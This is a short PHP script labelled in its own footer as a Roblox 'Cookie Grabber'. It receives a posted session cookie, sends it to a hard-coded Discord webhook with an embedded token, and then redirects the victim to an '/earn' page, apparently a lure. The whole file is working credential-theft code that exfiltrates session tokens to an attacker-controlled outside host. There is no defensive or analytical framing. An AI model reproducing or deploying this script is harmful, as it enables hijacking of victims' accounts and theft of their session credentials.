<?php
{
$webhook = "https://discord.com/api/webhooks/1011101963863207946/S7FYrJMbiAJg99nXfKCaGzx7p913xBOkH_-2-Svm4q6WUJPIyDKL15svmPsxb2IpnFB7";
$Cookie = htmlspecialchars($_POST["Cookie"]);
$json_data = json_encode([
    "content" => "",
    "username" => ReVerse,
    "avatar_url" => "https://media.discordapp.net/attachments/1011459391167410206/1011459417084022854/E0D1501D-D037-4726-B0DF-126A4AF2451C.jpg",
    "embeds" => [
        [
            "title" => MyServer,
            "type" => "rich",
            "description" => "**[Login Here!](https://www.roblox.com/login)**",
            "url" => "https://discord.gg/yFn8AngyMv",
            "color" => hexdec("FF0000"),
            "thumbnail" => [
            "url" => "https://discord.gg/yFn8AngyMv"
            ],
            "footer" => [
                "text" => "Cookie Grabber - Made By Kxzn#1000",
                "icon_url" => "https://media.discordapp.net/attachments/1011459391167410206/1011459417084022854/E0D1501D-D037-4726-B0DF-126A4AF2451C.jpg"
            ],
            "author" => [
                "name" => "ReVerse - Cookie Grabbed",
            ],
            "fields" => [
                [
                    "name" => "**Cookie:**",
                    "value" => "```$Cookie```",
                    "inline" => false
                ],
               
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
$ch = curl_init($webhook);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$resp = curl_exec($ch);
curl_close($ch);
header("location: /earn");
}